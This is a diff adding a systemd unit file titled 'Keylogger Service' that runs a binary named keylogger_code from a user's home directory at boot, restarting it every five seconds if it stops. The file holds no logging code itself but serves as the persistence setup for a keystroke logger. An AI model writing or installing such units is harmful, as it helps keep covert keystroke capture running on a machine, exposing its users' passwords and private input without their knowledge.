@@ -1,0 +1,14 @@
+[Unit]
+Description=Keylogger Service
+After=network.target
+
+[Service]
+ExecStart=/home/jatin-sh3334/keylogger_code
+Type=forking
+Restart=always
+RestartSec=5s
+StandardOutput=journal
+StandardError=journal
+
+[Install]
+WantedBy=multi-user.target
